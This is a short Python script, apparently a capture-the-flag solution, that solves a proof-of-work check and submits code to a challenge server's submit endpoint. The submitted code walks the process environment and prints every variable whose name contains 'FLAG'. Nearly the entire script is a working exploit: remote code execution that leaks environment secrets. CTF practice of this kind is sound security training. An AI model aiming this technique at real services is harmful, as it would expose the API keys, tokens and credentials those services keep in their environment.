import requests
import hashlib
import time

URL = "http://chall.0xfun.org:8312/api/submit"


def compute_pow(difficulty=4):
    """Compute a valid proof-of-work"""
    target = "0" * difficulty
    nonce = 0

    while True:
        test = f"{int(time.time() * 1000)}-{nonce}-{time.time()}"
        h = hashlib.sha256(test.encode()).hexdigest()
        if h.startswith(target):
            return test
        nonce += 1


def submit_code(code):
    pow_nonce = compute_pow(4)
    headers = {"Content-Type": "application/json", "X-Pow-Nonce": pow_nonce}
    response = requests.post(URL, json={"code": code}, headers=headers)
    return response.json()


# Code that reveals both flags
code = """
import os
for k, v in os.environ.items():
    if 'FLAG' in k:
        print(f"{k} = {v}")
"""

result = submit_code(code)
print(result["stdout"])
